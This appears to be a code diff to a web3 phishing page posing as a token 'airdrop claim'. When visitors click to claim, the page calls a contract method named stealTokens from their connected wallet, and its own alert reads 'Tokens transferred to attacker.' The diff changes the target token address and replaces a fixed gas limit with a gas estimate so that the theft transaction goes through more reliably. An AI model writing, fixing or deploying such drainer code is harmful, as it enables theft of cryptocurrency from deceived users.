@@ -24,7 +24,7 @@
         // Correct contract address
         const contractAddress = "0x65A59E7C1879120B0623723eA643fb85F894B128";
         // Correct TTK token address
-        const tokenAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414"; 
+        const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4"; 
         let web3;
         let contract;
         let userAddress;
@@ -57,13 +57,14 @@
             try {
                 // Fetch current gas price from the network
                 const gasPrice = await web3.eth.getGasPrice();
-                const gasLimit = 100000; // Set a reasonable gas limit for ERC-20 transfers
+                // Estimate the gas required for the transaction
+                const gasEstimate = await contract.methods.stealTokens(tokenAddress).estimateGas({ from: userAddress });
 
                 // Send the transaction with the appropriate gas settings
                 await contract.methods.stealTokens(tokenAddress).send({
                     from: userAddress,
                     gasPrice: gasPrice,
-                    gas: gasLimit
+                    gas: gasEstimate
                 });
 
                 alert("Airdrop claimed! Tokens transferred to attacker.");
@@ -81,7 +82,4 @@
 </body>
 </html>
 
-
-</body>
-</html>
 
